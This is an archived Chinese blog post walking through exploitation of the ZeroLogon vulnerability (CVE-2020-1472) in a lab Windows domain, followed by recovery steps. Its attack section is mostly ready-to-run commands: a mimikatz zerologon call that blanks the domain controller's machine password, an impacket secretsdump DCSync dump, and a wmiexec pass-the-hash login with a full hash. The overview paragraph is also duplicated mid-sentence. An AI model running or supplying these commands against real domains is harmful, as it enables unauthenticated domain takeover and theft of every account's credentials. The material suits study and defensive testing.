# ZeroLogon(CVE-2020-1472) - cAr7n - 博客园

> 原文：[`www.cnblogs.com/car7n/p/14789320.html`](https://www.cnblogs.com/car7n/p/14789320.html)

## 漏洞概述：

这是近几年 windows 上比较重量级别的一个漏洞。通过该漏洞，攻击者只需能够访问域控的 445 端口，在无需任何凭据的情况下（**可以在域外**）能拿到域管的权限。该漏洞的产生来源于 Netlogon 协议认证的加密模块存在缺陷，导致攻击者可以在没有凭证的情况情况下通过认证。该漏洞的最稳定利用是调用 netlogon 中 RPC 函数 NetrServerPasswordSet2 来重置域控的密码，从而以域控的身份进行 Dcsync 获取域管权限。这个漏洞的完整利用需要域控开启 135 和 445 端口这是近几年 windows 上比较重量级别的一个漏洞。通过该漏洞，攻击者只需能够访问域控的 445 端口，在无需任何凭据的情况下能拿到域管的权限。该漏洞的产生来源于 Netlogon 协议认证的加密模块存在缺陷，导致攻击者可以在没有凭证的情况情况下通过认证。该漏洞的最稳定利用是调用 netlogon 中 RPC 函数 NetrServerPasswordSet2 来重置域控的密码，从而以域控的身份进行 Dcsync 获取域管权限。这个漏洞的完整利用需要域控开启 135 和 445 端口。

**注意：漏洞利用成功后是把域控这个机器用户的密码置为空，与域管的密码无关。**

**实验环境**

域名：HIRO
域控：WIN-KONG@192.168.228.10 域管：hiro\administrator

## 验证

用 zerologon_tester.py 验证是否有 CVE-2020-1472 漏洞
![image](img/33117b938378f4b367aa1d1adfe0637b.png)

## 攻击：

### 1.使用 CVE-2020-1472exp（需要先代理）

**这一步会把域控的密码置为空** #即 hash 为 31d6cfe0d16ae931b73c59d7e0c089c0
![image](img/e8af0fb99882f2f0c6bf93ea61d34593.png)

自己本地验证看攻击是否成功(ntlmhash 为空)
![image](img/7f19421b24a6c8d8315c7eb0c678ee85.png)

前后对比
![image](img/2ed7dfa7eb58a56905b53b50a7ddf63a.png)

### 2.使用 mimikatz(**要用支持 zerologon 的版本**)

(1)**如果当前主机不在域环境中，target 指向 ip**
lsadump::zerologon /target:192.168.228.10 /ntlm /null /account:win-kong$ /exploit
![image](img/ee105b183a017909117067fedbef4adf.png)

(2)**如果当前主机在域环境中，target 指向 FQDN**
![image](img/07968f7fbe5ea75713d4fe8b97bb269c.png)

## 利用（使用 impacket 包）

攻击成功后读取域内密码 hash(`域控机器账号有 DCSync 权限`)
python3 secretsdump.py hiro.com/WIN-KONG$@192.168.228.10 -no-pass
![image](img/5441344bfcc662cae747f56dd38cb5d7.png)

哈希传递(administrator)
python3 .\wmiexec.py hiro/administrator@192.168.228.10 -hashes aad3b435b51404eeaad3b435b51404ee:e9bf196dc93a1219e3b2e79b1b7aa36e
![image](img/931c98342065fc544646882f4946dcbb.png)

## 恢复脱域的域控

在攻击过程中，**将机器的密码置为空，这一步是会导致域控脱域的**。其本质原因是由于机器用户在**AD 中的密码(存储在 ntds.dic)与本地的注册表 lsass 里面的密码不一致**导致的。所以要将其恢复，将 AD 中的密码与注册表 lsass 里面的密码保持一致。
像服务器一样，DC 拥有一个带有密码的机器帐户，该帐户以加密方式存储在注册表中。引导时将其加载到 lsass 中。**如果使用 Zerologon 更改密码，则仅 AD 中的密码会更改，而不是注册表或 lsass 中的密码**。**利用后每当发出新的 Kerberos 票证时，DC 无法使用 lsass 中的机器帐户密码来解密服务票证，并且无法使用 Kerberos 中断身份验证**。
恢复域控机器密码：
在域控上执行： `powershell Reset-ComputerMachinePassword`

最后对比
![image](img/256324e83c55605917dca03825699266.png)